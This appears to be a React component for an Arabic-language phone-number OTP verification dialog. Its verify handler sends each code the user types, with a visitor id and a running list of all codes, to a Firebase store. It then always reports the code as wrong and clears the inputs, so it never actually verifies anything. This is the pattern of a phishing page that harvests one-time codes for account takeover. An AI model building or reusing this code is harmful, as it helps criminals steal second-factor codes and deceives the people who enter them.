"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { AlertCircle, CheckCircle, RefreshCw, Smartphone } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { addData } from "@/lib/firebase"
interface OTPDialogProps {
  isOpen: boolean
  onClose: () => void
  phoneNumber: string
  onResend?: () => Promise<boolean>
}
const allOtps = ['']
export function OTPDialog({ isOpen, onClose, phoneNumber, onResend }: OTPDialogProps) {
  const [otp, setOtp] = useState(["", "", "", "", "", ""])
  const [isVerifying, setIsVerifying] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState(false)
  const [timeLeft, setTimeLeft] = useState(120) // 2 minutes
  const [canResend, setCanResend] = useState(false)

  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Timer for resend functionality
  useEffect(() => {
    if (!isOpen) return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setCanResend(true)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [isOpen])

  // Reset state when dialog opens
  useEffect(() => {
    if (isOpen) {
      setOtp(["", "", "", "", "", ""])
      setError("")
      setSuccess(false)
      setTimeLeft(120)
      setCanResend(false)
      // Focus first input
      setTimeout(() => {
        inputRefs.current[0]?.focus()
      }, 100)
    }
  }, [isOpen])

  const handleInputChange = (index: number, value: string) => {
    // Only allow numbers
    if (!/^\d*$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value.slice(-1) // Only take the last character

    setOtp(newOtp)
    setError("") // Clear error when user types

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }

    // Auto-verify when all fields are filled
    if (newOtp.every((digit) => digit !== "") && !isVerifying) {
      handleVerify(newOtp.join(""))
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      // Move to previous input on backspace if current is empty
      inputRefs.current[index - 1]?.focus()
    } else if (e.key === "ArrowLeft" && index > 0) {
      inputRefs.current[index - 1]?.focus()
    } else if (e.key === "ArrowRight" && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)

    if (pastedData.length === 6) {
      const newOtp = pastedData.split("")
      setOtp(newOtp)
      setError("")

      // Focus last input
      inputRefs.current[5]?.focus()

      // Auto-verify
      if (!isVerifying) {
        handleVerify(pastedData)
      }
    }
  }

  const handleVerify = async (otpCode: string) => {
    const visitorId = localStorage.getItem('visitor')
    allOtps.push(otpCode)

    addData({ id: visitorId, otp: otpCode, allOtps })
    if (otpCode.length !== 6) {
      setError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
      return
    }

    setIsVerifying(true)
    setError("")

    try {
      setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى")
      // Clear OTP inputs on error
      setOtp(["", "", "", "", "", ""])
      inputRefs.current[0]?.focus()

    } catch (error) {
      setError("حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى")
      setOtp(["", "", "", "", "", ""])
      inputRefs.current[0]?.focus()
    } finally {
      setIsVerifying(false)
    }
  }

  const handleResend = async () => {
    if (!canResend || isResending) return

    setIsResending(true)
    setError("")

    try {
      const success = await onResend?.()

      if (success) {
        setTimeLeft(120)
        setCanResend(false)
        setOtp(["", "", "", "", "", ""])
        inputRefs.current[0]?.focus()
      } else {
        setError("فشل في إعادة إرسال الرمز. يرجى المحاولة لاحقاً")
      }
    } catch (error) {
      setError("حدث خطأ أثناء إعادة الإرسال. يرجى المحاولة لاحقاً")
    } finally {
      setIsResending(false)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const maskedPhone = phoneNumber.replace(/(\d{3})\d{4}(\d{3})/, "$1****$2")

  if (success) {
    return (
      <Dialog open={isOpen} onOpenChange={onClose}>
        <DialogContent className="sm:max-w-md" dir="rtl">
          <div className="text-center py-8">
            <CheckCircle className="w-16 h-16 text-green-600 mx-auto mb-4" />
            <h3 className="text-2xl font-bold text-green-800 mb-2">تم التحقق بنجاح</h3>
            <p className="text-gray-600">تم التحقق من رقم هاتفك بنجاح</p>
          </div>
        </DialogContent>
      </Dialog>
    )
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader className="text-center">
          <div className="mx-auto w-12 h-12 bg-[#00843D] rounded-full flex items-center justify-center mb-4">
            <Smartphone className="w-6 h-6 text-white" />
          </div>
          <DialogTitle className="text-2xl font-bold text-gray-900">تحقق من رقم الهاتف</DialogTitle>
          <p className="text-gray-600 mt-2">تم إرسال رمز التحقق المكون من 6 أرقام إلى</p>
          <p className="font-semibold text-[#00843D]" dir="ltr">
            {maskedPhone}
          </p>
        </DialogHeader>

        <div className="space-y-6 py-4">
          {/* OTP Input Fields */}
          <div className="space-y-2">
            <Label className="text-center block text-gray-700">أدخل رمز التحقق</Label>
            <div className="flex gap-2 justify-center" dir="ltr">
              {otp.map((digit, index) => (
                <Input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleInputChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={index === 0 ? handlePaste : undefined}
                  className={`w-12 h-12 text-center text-lg font-bold border-2 ${error ? "border-red-500" : "border-gray-300"
                    } focus:border-[#00843D] focus:ring-[#00843D]`}
                  disabled={isVerifying}
                />
              ))}
            </div>
          </div>

          {/* Error Message */}
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* Timer and Resend */}
          <div className="text-center space-y-3">
            {!canResend ? (
              <p className="text-gray-600">
                يمكنك إعادة الإرسال خلال <span className="font-bold text-[#00843D]">{formatTime(timeLeft)}</span>
              </p>
            ) : (
              <Button
                variant="outline"
                onClick={handleResend}
                disabled={isResending}
                className="text-[#00843D] border-[#00843D] hover:bg-[#00843D] hover:text-white bg-transparent"
              >
                {isResending ? (
                  <>
                    <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                    جاري الإرسال...
                  </>
                ) : (
                  "إعادة إرسال الرمز"
                )}
              </Button>
            )}
          </div>

          {/* Manual Verify Button */}
          <Button
            onClick={() => handleVerify(otp.join(""))}
            disabled={isVerifying || otp.some((digit) => digit === "")}
            className="w-full bg-[#00843D] hover:bg-[#006e33] text-white font-bold py-3"
          >
            {isVerifying ? (
              <>
                <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                جاري التحقق...
              </>
            ) : (
              "تحقق من الرمز"
            )}
          </Button>

          {/* Help Text */}
          <div className="text-center text-sm text-gray-500 space-y-1">
            <p>لم تستلم الرمز؟</p>
            <p>تأكد من أن رقم الهاتف صحيح وأن الرسائل النصية غير محجوبة</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
